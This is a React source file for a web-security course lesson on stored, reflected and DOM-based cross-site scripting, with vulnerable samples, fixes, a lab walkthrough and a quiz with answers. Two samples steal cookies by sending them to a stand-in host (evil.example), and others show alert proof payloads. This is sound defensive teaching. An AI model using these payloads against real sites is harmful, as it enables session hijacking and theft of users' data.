import type { Metadata } from "next";
import Link from "next/link";
import { ArrowRight, ArrowLeft, FlaskConical } from "lucide-react";
import CodeBlock from "@/components/CodeBlock";
import Callout from "@/components/Callout";
import Quiz from "@/components/Quiz";
import type { QuizQuestion } from "@/components/Quiz";

export const metadata: Metadata = {
  title: "Cross-Site Scripting (XSS)",
  description:
    "Stored, reflected, and DOM-based XSS explained by where each lives in the request/response cycle, with the correct fix for each.",
};

const questions: QuizQuestion[] = [
  {
    question:
      "A comment you post is saved to the database and rendered, unescaped, for every future visitor to that page. What type of XSS is this?",
    options: ["Reflected XSS", "Stored XSS", "DOM-based XSS", "Blind SQL injection"],
    correctIndex: 1,
    explanation:
      "Stored XSS persists the payload server-side (in a database, file, or log), so it executes for every user who later views the affected page — no need to trick anyone into clicking a crafted link.",
  },
  {
    question:
      "An attacker sends a victim a link like `search?q=<script>...</script>`, and the query parameter is echoed directly into the page's HTML. What type of XSS is this?",
    options: ["Stored XSS", "Reflected XSS", "Second-order SQL injection", "CSRF"],
    correctIndex: 1,
    explanation:
      "Reflected XSS round-trips through the server in a single request/response — the payload lives in the URL or request, not in stored data, so it requires the victim to click a crafted link.",
  },
  {
    question:
      "Why can't server-side output encoding alone stop DOM-based XSS?",
    options: [
      "DOM-based XSS doesn't actually exist",
      "The vulnerable data flow (source to sink) happens entirely in client-side JavaScript and may never touch the server at all",
      "DOM-based XSS only affects Internet Explorer",
      "Because DOM-based XSS uses SQL instead of JavaScript",
    ],
    correctIndex: 1,
    explanation:
      "If client-side code reads something like `location.hash` and writes it into the page with `innerHTML`, the entire vulnerable path can happen in the browser — the server never sees that data, so server-side fixes don't apply.",
  },
  {
    question:
      "What's the correct general fix for XSS?",
    options: [
      "Blocklist the word <script> from all user input",
      "Context-aware output encoding at the point of render, matched to where the data lands (HTML body, attribute, JS string, URL)",
      "Disable JavaScript in the user's browser",
      "Store all user input in a separate database from the app",
    ],
    correctIndex: 1,
    explanation:
      "Different rendering contexts need different encoding — HTML-encoding data that lands inside a `<script>` block doesn't stop it from executing. Modern frameworks (React, Vue) auto-escape HTML context by default, which is why the *sinks* that bypass that (innerHTML, dangerouslySetInnerHTML) are the ones to audit closely.",
  },
];

export default function XssLesson() {
  return (
    <div>
      <div className="border-b border-border bg-white/[0.015]">
        <div className="mx-auto max-w-3xl px-6 py-10">
          <Link
            href="/courses/web-application-security"
            className="flex items-center gap-1.5 font-mono text-xs text-text-faint hover:text-text-dim"
          >
            <ArrowLeft size={13} /> Web Application Security Fundamentals
          </Link>
          <div className="mt-3 font-mono text-xs text-text-faint">
            Module 02 · Lesson 1 of 1 · 2h 05m
          </div>
          <h1 className="mt-2 text-3xl font-bold text-text">
            Cross-Site Scripting (XSS)
          </h1>
        </div>
      </div>

      <article className="mx-auto max-w-3xl px-6 py-12">
        <section>
          <h2 className="text-xl font-semibold text-text">
            The core idea
          </h2>
          <p className="mt-4 text-[15px] leading-relaxed text-text-dim">
            SQL injection confuses a database about what's data vs. query
            syntax. XSS does the same thing to a browser, but with HTML and
            JavaScript: if user-controlled text ends up inside a page
            without being encoded for the context it lands in, a browser
            can't tell "text the developer wrote" from "a script the
            attacker wrote." It just parses and runs it.
          </p>
          <p className="mt-4 text-[15px] leading-relaxed text-text-dim">
            There are three distinct flavors, and they matter because each
            one needs a different fix.
          </p>
        </section>

        <section className="mt-10">
          <h3 className="font-semibold text-text">1. Stored XSS</h3>
          <p className="mt-3 text-[15px] leading-relaxed text-text-dim">
            The payload is saved server-side — a comment, a username, a
            support ticket — and rendered for every visitor who later loads
            that page. This is the most dangerous variant: no social
            engineering required, and it can hit every user of the app,
            including administrators.
          </p>
        </section>

        <div className="mt-6">
          <CodeBlock
            label="vulnerable — comment rendered unescaped"
            code={`<div class="comment">
  {{ comment.body }}   <!-- rendered as raw HTML, no encoding -->
</div>

<!-- comment.body stored in the DB as: -->
<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">`}
          />
        </div>

        <section className="mt-10">
          <h3 className="font-semibold text-text">2. Reflected XSS</h3>
          <p className="mt-3 text-[15px] leading-relaxed text-text-dim">
            The payload travels in the request itself — usually a URL
            parameter — and the server echoes it straight back into the
            response HTML. It only fires for whoever clicks the crafted
            link, which is why these show up in phishing campaigns.
          </p>
        </section>

        <div className="mt-6">
          <CodeBlock
            label="vulnerable — search query echoed into the page"
            code={`// server template
<p>You searched for: <%= request.query.q %></p>

// crafted link sent to a victim:
https://shop.example/search?q=<script>document.location=
  'https://evil.example/steal?c='+document.cookie</script>`}
          />
        </div>

        <section className="mt-10">
          <h3 className="font-semibold text-text">3. DOM-based XSS</h3>
          <p className="mt-3 text-[15px] leading-relaxed text-text-dim">
            The entire vulnerable flow can happen inside client-side
            JavaScript, with data that never touches the server. A "source"
            (something attacker-controlled, like{" "}
            <code className="font-mono text-text">location.hash</code>) flows
            into a "sink" (something that executes HTML/JS, like{" "}
            <code className="font-mono text-text">innerHTML</code>).
          </p>
        </section>

        <div className="mt-6">
          <CodeBlock
            label="vulnerable — client-side sink"
            code={`// page.example/#<img src=x onerror=alert(document.domain)>
const name = decodeURIComponent(location.hash.slice(1));
document.getElementById("welcome").innerHTML = "Welcome, " + name;`}
          />
        </div>

        <Callout type="note">
          The server may serve completely static HTML here — a WAF
          inspecting requests would never see this payload, because it's
          constructed and executed entirely client-side after the page
          loads. This is why "sanitize on the server" is necessary but not
          sufficient.
        </Callout>

        <section className="mt-12">
          <h2 className="text-xl font-semibold text-text">
            The fix: context-aware output encoding
          </h2>
          <p className="mt-4 text-[15px] leading-relaxed text-text-dim">
            The rule isn't "escape HTML." It's "encode for the exact
            context the data lands in" — the encoding rules differ between
            an HTML body, an HTML attribute, a JavaScript string, a CSS
            value, and a URL. Getting the context wrong is how encoded data
            still ends up executable.
          </p>
        </section>

        <div className="mt-6">
          <CodeBlock
            label="fixed — React auto-escapes HTML context by default"
            code={`function Comment({ body }: { body: string }) {
  // React encodes {body} for the HTML text context automatically.
  return <div className="comment">{body}</div>;
}

// The dangerous escape hatch — audit every use of this in a codebase:
// <div dangerouslySetInnerHTML={{ __html: body }} />`}
          />
        </div>

        <Callout type="tip">
          If your framework auto-escapes by default (React, Vue, most modern
          templating engines), your highest-value review target is every
          place that opts back out of it —{" "}
          <code className="font-mono">dangerouslySetInnerHTML</code>,{" "}
          <code className="font-mono">v-html</code>,{" "}
          <code className="font-mono">innerHTML</code>,{" "}
          <code className="font-mono">document.write</code>. Grep for those
          before anything else.
        </Callout>

        {/* Lab walkthrough */}
        <section className="mt-16 rounded-xl border border-green/20 bg-green/[0.03] p-6 md:p-8">
          <div className="flex items-center gap-2 font-mono text-xs uppercase tracking-wider text-green">
            <FlaskConical size={14} /> Hands-on lab
          </div>
          <h2 className="mt-3 text-xl font-semibold text-text">
            Lab: Find and fix a stored XSS in a practice comment box
          </h2>
          <p className="mt-3 text-[15px] leading-relaxed text-text-dim">
            The lab spins up a small, intentionally-vulnerable message
            board seeded with sample posts, isolated from the internet.
          </p>
          <ol className="mt-5 space-y-3 text-sm leading-relaxed text-text-dim">
            <li>
              <strong className="text-text">1. Probe.</strong> Post a
              comment containing a harmless marker like{" "}
              <code className="font-mono">&lt;b&gt;test&lt;/b&gt;</code>. If
              it renders bold instead of as literal text, the app is
              rendering your input as HTML.
            </li>
            <li>
              <strong className="text-text">2. Prove impact, safely.</strong>{" "}
              Post{" "}
              <code className="font-mono">
                &lt;img src=x onerror=alert(document.domain)&gt;
              </code>{" "}
              — an alert box confirming the current domain is the standard,
              non-destructive way to prove script execution without
              actually exfiltrating anything.
            </li>
            <li>
              <strong className="text-text">3. Confirm it's stored.</strong>{" "}
              Reload the page in a fresh session — if the alert fires again
              without resubmitting anything, the payload is persisted
              server-side.
            </li>
            <li>
              <strong className="text-text">4. Fix it.</strong> In the code
              editor tab, switch the render from raw HTML injection to the
              framework's default text-encoding output. Re-run the grader,
              which reposts the same payload and confirms it now renders as
              inert text.
            </li>
          </ol>
        </section>

        <section className="mt-16">
          <Quiz title="Cross-Site Scripting" questions={questions} />
        </section>

        <nav className="mt-16 flex items-center justify-between border-t border-border pt-8">
          <Link
            href="/courses/web-application-security/lessons/sql-injection"
            className="flex items-center gap-1.5 font-mono text-sm text-text-dim hover:text-text"
          >
            <ArrowLeft size={14} /> SQL Injection
          </Link>
          <Link
            href="/courses/web-application-security/lessons/secure-headers"
            className="flex items-center gap-1.5 rounded-md bg-green px-5 py-2.5 font-mono text-sm font-semibold text-bg transition-transform hover:-translate-y-0.5 hover:shadow-glow"
          >
            Next: Security Headers <ArrowRight size={14} />
          </Link>
        </nav>
      </article>
    </div>
  );
}
